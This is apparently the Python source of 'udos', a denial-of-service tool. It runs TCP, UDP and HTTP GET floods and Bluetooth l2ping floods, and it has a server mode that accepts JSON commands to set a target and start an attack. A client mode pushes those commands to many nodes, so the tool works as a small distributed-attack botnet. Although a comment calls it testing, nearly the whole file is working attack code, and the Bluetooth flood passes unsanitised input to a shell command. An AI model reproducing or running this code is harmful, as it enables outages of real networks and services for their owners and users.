import pantheradesktop.kernel
import sys
import os
import random
import socket
import json
import SocketServer
import time

try:
    from PySide import QtCore, QtGui
except ImportError:
    from PyQt4 import QtCore, QtGui


if sys.version_info[0] >= 3:
    import http.client as httplib
    from urllib.parse import urlparse
else:
    import httplib
    from urlparse import urlparse

class udosApp(pantheradesktop.kernel.pantheraDesktopApplication):
    """
        Udos main class
        Here are processed all operations 
    """
    
    appName = "udos"
    socketType = "tcp"
    target = None
    destPort = 80
    packetSize = 256
    breakSignal = False
    showCountEvery = 50
    
    # server mode
    mode = "normal"
    serverBufferSize = 2048
    serverIP = "0.0.0.0"
    serverPORT = 8020
    clients = list()
    run = False
    stopBefore = False
    appThread = None
    appWorker = None
    
    def udosMain(self, data=''):
        """ Main function """
        
        self.logging.output("Running in "+self.mode+" mode", 'udos')
            
        # server mode for DDoS testing
        if self.mode == "bind":
            self.serverMode()
            self.pa_exit()
        elif self.mode == "client":
            self.clientMode()
            self.pa_exit()
            
        if not self.target:
            self.pa_exit()
            
        self.logging.output("Target: "+self.target, 'udos')
        self.logging.output("Port: "+str(self.destPort), 'udos')
        self.logging.output("Packet size: "+str(self.packetSize), 'udos')
            
        self.dispatchAction()
        
    def clientMode(self):
        for client in self.clients:
            exp = client.split(':')

            if len(exp) != 2:
                continue
            
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                remote_ip = socket.gethostbyname(exp[0])
                s.connect((remote_ip , int(exp[1])))

                if self.stopBefore:
                    s.sendall('{"function": "Stop", "data": 1}')
                    s.sendall("\n")
                    
                s.sendall('{"function": "SetAddress", "data": "'+str(self.target)+'"}')
                s.sendall("\n")
                s.sendall('{"function": "SetPort", "data": '+str(self.destPort)+'}')
                s.sendall("\n")
                s.sendall('{"function": "PacketSize", "data": "'+str(self.packetSize)+'"}')
                s.sendall("\n")
                s.sendall('{"function": "SocketType", "data": "'+str(self.socketType)+'"}')
                s.sendall("\n")
                
                if self.run:
                    s.sendall('{"function": "Run", "data": 1}')
                    s.sendall("\n")
                    
                #while s.recv(4096):
                #    continue
                    
                s.close()
            except Exception as e:
                print("Cannot connect to "+client+", "+str(e))
            
            
    def dispatchAction(self):
        if self.socketType == 'http':
            self.httpAttack()
        elif self.socketType == 'rfc':
            self.btAttack()
        elif self.socketType in ('tcp', 'udp', 'TCP', 'UDP'):
            self.ethAttack()
            
    def btAttack(self):
        """ Simple bluetooth flood using external tool """
        
        try:
            if not os.path.isfile("/usr/bin/l2ping"):
                print("Cannot find /usr/bin/l2ping, please install l2ping to use this feature.")
                sys.exit(0)
    
            self.logging.output("Executing /usr/bin/l2ping -f "+self.target+" -s "+str(self.packetSize))
            sto = os.system ("/usr/bin/l2ping -f "+self.target+" -s "+str(self.packetSize))
        except KeyboardInterrupt:
            sys.exit(0)
            
            
            
    def ethAttack(self):
        ''' Ethernet/Wireless test function '''
    
        # number of packets for summary
        packets_sent = 0
        counter = 0
        
        # TCP flood
        if self.socketType == "tcp":
            sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        else: # UDP flood
            sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
    
        bytes=random._urandom(int(self.packetSize))
        
        try:
            sock.connect((socket.gethostbyname(self.target), int(self.destPort)))
        except socket.error as e:
            print("Error: Cannot connect to destination, "+str(e))
            self.app.pa_exit(0)
    
        sock.settimeout(None)
    
        try: 
            while True:
               if self.breakSignal:
                   break
               
               try:
                   sock.sendto(bytes,(socket.gethostbyname(self.target),int(self.destPort)))
                   packets_sent=packets_sent+1
                   counter=counter+1
                   
                   if counter >= self.showCountEvery:
                       print("Sent "+str(packets_sent)+" packets of total "+str(packets_sent*self.packetSize)+" bytes")
                       counter = 0
                   
               except socket.error:
                   self.logging.output("Reconnecting: ip="+str(self.target)+", port="+str(self.destPort)+", packets_sent="+str(packets_sent), 'ethAttack') # propably dropped by firewall
    
                   try:
                       sock.close()
                       
                       if self.socketType == "tcp":
                            sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                       else: # UDP flood
                            sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
                            
                       sock.connect(addr)
                   except socket.error as e:
                       self.logging.output("Exception: "+str(e), 'ethAttack')
    
        except KeyboardInterrupt:
            print("Info: Sent "+str(packets_sent)+" packets.")
            
            
    def serverMode(self):
        app = QtGui.QApplication(sys.argv)
        SocketServer.TCPServer.allow_reuse_address = True
        server = SocketServer.ThreadingTCPServer((self.serverIP, self.serverPORT), udosRequestHandler)

        # Activate the server; this will keep running until you
        # interrupt the program with Ctrl-C
        
        self.logging.output("Listening on "+self.serverIP+":"+str(self.serverPORT), 'serverMode')
        server.serve_forever()
        
            
            
    def httpAttack(self):
        ''' Simple HTTP attacks '''
        
        counter = 0
        requests_sent = 0
        timeouts = 0
        o = urlparse(self.target)
        self.logging.output("Starting HTTP GET flood on \""+o.netloc+":"+str(self.destPort)+"\"...", 'http_attack')
    
        try:
            while True:
                if self.breakSignal:
                    break
                
                try:
                    connection = httplib.HTTPConnection(o.netloc+":"+str(self.destPort), timeout=2)
                    connection.request("GET", o.path)
                    requests_sent = requests_sent + 1
                    counter=counter+1
                   
                    if counter >= self.showCountEvery:
                        print("Sent "+str(requests_sent)+" packets of total "+str(requests_sent*self.packetSize)+" bytes")
                        counter = 0
                        
                except Exception as err:
                   if "timed out" in err:
                       timeouts = timeouts + 1
                       
                   self.logging.output(str(err), 'udos')
    
        except KeyboardInterrupt:
            print("Info: Maked "+str(requests_sent)+" requests.\nTimeouts: "+str(timeouts))
            
class udosRequestHandler(SocketServer.BaseRequestHandler):
    """
    The RequestHandler class for our server.

    It is instantiated once per connection to the server, and must
    override the handle() method to implement communication to the
    client.
    """
    
    def handleRequestStop(self, data):
        """ Stop current work """
        
        self.app.breakSignal = data
        time.sleep(1)
        self.app.breakSignal = not data
        
        self.request.send('{"return": true}')
        
    def handleRequestRun(self, data):
        """ Attack selected target """
        
        self.app.appThread = pantheradesktop.kernel.pantheraWorkThread()
        
        self.app.appWorker = pantheradesktop.kernel.pantheraWorker()
        self.app.appWorker.setJob(self.app.dispatchAction)
        self.app.appWorker.moveToThread(self.app.appThread)
        self.app.appWorker.finished.connect(self.app.appThread.quit)
        
        self.app.appThread.started.connect(self.app.appWorker.run)
        self.app.appThread.start()
        
    def handleRequestPacketSize(self, data):
        """ Set packet size """
        
        try:
            self.app.packetSize = int(data)
            self.request.send('{"return": true}')
        except Exception:
            self.request.send('{"return": true, "err": "Not a integer"}')
        
    def handleRequestSocketType(self, data):
        """ Set socket type """
        
        if not data in ('tcp', 'udp', 'rfc', 'http'):
            self.request.send('{"return": true, "err": "Invalid socket type"}')
        else:
            self.app.socketType = data
            
            
        
    def handleRequestSetAddress(self, data):
        """ Set target address """
        
        self.app.target = data
        self.request.send('{"return": true}')
        
        
        
    def handleRequestSetPort(self, data):
        """ Set target port """
        
        try:
            self.app.destPort = int(data)
            self.request.send('{"return": true}')
        except Exception as e:
            self.request.send('{"return": true, "err": "'+str(e)+'"}')
    
    
    
    def handle(self):
        self.app = udosApp()
        self.app.logging.output("Connected new client "+str(format(self.client_address[0])), 'server')
        
        while 1:
            # self.request is the TCP socket connected to the client
            self.data = self.request.recv(9999).strip()

            # close connection if client disconnected
            if not self.data:
                self.app.logging.output("Client "+str(format(self.client_address[0]))+" exited", 'server')
                return False
            
            self.app.logging.output("Request from "+str(format(self.client_address[0])), 'server')
            
            multilineData = self.data.split("\n")
            
            for line in multilineData:
                self.handleJSON(line)
            
        self.request.close()

    def handleJSON(self, data):
        try:
            jsonData = json.loads(data)
        except Exception as e:
             self.app.logging.output("Invalid JSON request: "+str(data))
             self.request.send('{"return": false}')
             return False
        
        if not "function" in jsonData or not "data" in jsonData:
            self.app.logging.output("Invalid JSON request, no 'function' and 'data' fields")
            self.request.send('{"return": false}')
            return False
            
        functionName = "handleRequest"+jsonData['function']
        self.app.logging.output(jsonData['function']+"("+str(jsonData['data'])+")", 'server')
            
        if hasattr(self, functionName):
            try:
                getattr(self, functionName)(jsonData['data'])
            except Exception:
                pass
        else:
            self.app.logging.output("No such function '"+functionName+"'", 'server')
            self.request.send('{"return": false, "err": "No such function"}')
